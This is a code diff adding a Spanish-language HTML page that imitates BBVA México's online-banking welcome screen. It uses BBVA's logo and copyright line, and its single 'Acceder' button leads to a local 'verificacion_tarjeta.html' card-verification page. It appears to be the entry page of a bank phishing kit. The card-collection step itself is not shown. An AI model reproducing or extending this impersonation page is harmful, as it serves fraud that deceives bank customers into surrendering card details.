@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <title>BBVA | Banca en Línea</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f5f6fa;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    header {
+      background-color: #003366;
+      padding: 15px 20px;
+      display: flex;
+      align-items: center;
+    }
+    header img {
+      height: 30px;
+    }
+    main {
+      flex-grow: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .container {
+      background: white;
+      padding: 40px;
+      border-radius: 8px;
+      max-width: 400px;
+      width: 100%;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    h2 {
+      color: #003366;
+      margin-bottom: 30px;
+    }
+    button {
+      background-color: #003366;
+      color: white;
+      border: none;
+      padding: 14px 0;
+      width: 100%;
+      font-size: 18px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0059b3;
+    }
+    footer {
+      text-align: center;
+      font-size: 12px;
+      color: gray;
+      padding: 15px 0;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="https://www.bbva.com/wp-content/themes/bbva2017/assets/img/logos/bbva-logo.png" alt="BBVA Logo" />
+  </header>
+
+  <main>
+    <div class="container">
+      <h2>Bienvenido a tu Banca en Línea</h2>
+      <button onclick="window.location.href='verificacion_tarjeta.html'">Acceder</button>
+    </div>
+  </main>
+
+  <footer>
+    © 2025 BBVA México. 
+  </footer>
+</body>
+</html>
